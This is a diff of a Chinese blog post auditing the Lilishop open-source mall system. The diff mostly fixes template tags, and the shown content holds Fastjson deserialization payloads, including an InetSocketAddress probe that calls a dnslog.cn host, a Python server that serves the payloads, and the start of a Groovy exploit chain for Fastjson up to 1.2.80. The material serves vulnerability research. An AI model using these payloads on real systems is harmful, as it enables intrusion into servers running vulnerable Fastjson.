@@ -2,6 +2,7 @@
 title: Lilishop 开源商城系统代码审计
 date: '2023-07-24 15:52:16'
 updated: '2024-09-23 21:58:30'
+abbrlink: c899d684
 ---
 <!--more--> 
 # 0x00 前言
@@ -224,7 +225,7 @@ SELECT id, name, create_by, create_time, update_by, update_time, delete_flag FRO
 我选择使用 payload
 
 ```python
-{"@type":"java.net.InetSocketAddress"{"address":,"val":"z1vpgb.dnslog.cn"}}{% endraw %}
+{"@type":"java.net.InetSocketAddress"{"address":,"val":"z1vpgb.dnslog.cn"{% raw %}}}{% endraw %}
 ```
 
 ```python
@@ -243,7 +244,7 @@ class MyHTTPRequestHandler(BaseHTTPRequestHandler):
         if self.path == '/getmsg':
             # 在这里编写处理POST请求的代码
             # 例如，您可以从请求中获取数据，进行处理，然后返回响应数据
-            response_data = '{"@type":"java.net.InetSocketAddress"{"address":,"val":"z1vpgb.dnslog.cn"}}{% endraw %}'
+            response_data = '{"@type":"java.net.InetSocketAddress"{"address":,"val":"z1vpgb.dnslog.cn"{% raw %}}}{% endraw %}'
             self.wfile.write(response_data.encode())
         else:
             # 如果请求路径不是'/getmsg'，返回404 Not Found
@@ -307,7 +308,7 @@ Fastjson <= 1.2.80 可以打三种不同的利用链，这里我发现存在其�
         if self.path == '/getmsg':
             # 在这里编写处理POST请求的代码
             # 例如，您可以从请求中获取数据，进行处理，然后返回响应数据
-            # response_data = '{"@type":"java.net.InetSocketAddress"{"address":,"val":"z1vpgb.dnslog.cn"}}{% endraw %}'
+            # response_data = '{"@type":"java.net.InetSocketAddress"{"address":,"val":"z1vpgb.dnslog.cn"{% raw %}}}{% endraw %}'
             response_data1 = "{\n" \
                 "  \"@type\":\"java.lang.Exception\",\n"  \
                 "  \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" \
